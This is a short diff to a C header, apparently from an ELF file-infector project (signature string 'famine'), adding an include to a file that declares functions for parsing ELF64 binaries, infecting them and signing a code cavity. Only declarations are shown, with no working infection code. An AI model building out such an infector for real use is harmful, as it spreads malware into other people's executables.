@@ -5,6 +5,7 @@
 #include <dirent.h> // struct dirent
 #include <elf.h> // Elf64_Ehdr, Elf64_Phdr
 #include <stddef.h> // size_t
+#include <stdint.h> // uintX_t
 
 /* Defines */
 #define SIGNATURE "famine"
@@ -42,6 +43,7 @@ int is_valid_elf(t_file *file);
 void process_elf64(t_file *file);
 int parse_elf64(t_file *file, t_elf64 *elf64);
 uint64_t elf64_find_next_segment(Elf64_Phdr *phdr, uint32_t phnum, uint32_t index);
+
 void infect_elf64(t_file *file, t_elf64 *elf64);
 int sign_elf64_cavity(t_file *file, t_elf64 *elf64);
 
